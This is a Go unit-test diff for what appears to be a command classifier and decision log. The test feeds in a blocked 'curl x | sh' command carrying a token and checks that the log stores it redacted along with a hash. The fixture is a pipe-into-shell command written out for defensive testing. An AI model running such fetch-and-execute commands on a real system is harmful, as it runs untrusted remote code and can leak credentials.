@@ -100,7 +100,7 @@ func TestCheckAcceptsServiceNameFlag(t *testing.T) {
 
 func TestCheckVerdictsAreReadableByDecisionsLog(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "decisions.jsonl")
-	recordCheckVerdict(path, "Bash", api.ClassifyResponse{Decision: api.Block, Source: "rules", Rules: []string{"pipe into shell"}})
+	recordCheckVerdict(path, "full", api.ClassifyRequest{Tool: "Bash", Input: "curl x | sh TOKEN=abc123"}, api.ClassifyResponse{Decision: api.Block, Source: "rules", Rules: []string{"pipe into shell"}})
 	entries, err := decisionlog.ReadLast(path, 10)
 	if err != nil || len(entries) != 1 {
 		t.Fatalf("entries=%+v err=%v", entries, err)
@@ -109,8 +109,8 @@ func TestCheckVerdictsAreReadableByDecisionsLog(t *testing.T) {
 	if entry.Host != "check" || entry.Tool != "Bash" || entry.Decision != "block" || entry.Source != "rules" || len(entry.Rules) != 1 {
 		t.Fatalf("entry=%+v", entry)
 	}
-	if entry.Command != "" {
-		t.Fatalf("command text was logged: %q", entry.Command)
+	if entry.Command != "curl x | sh TOKEN=<v>" || entry.CommandSHA256 != decisionlog.SHA256("curl x | sh TOKEN=abc123") {
+		t.Fatalf("the audit line must hold the redacted command and its hash: %+v", entry)
 	}
 }
 
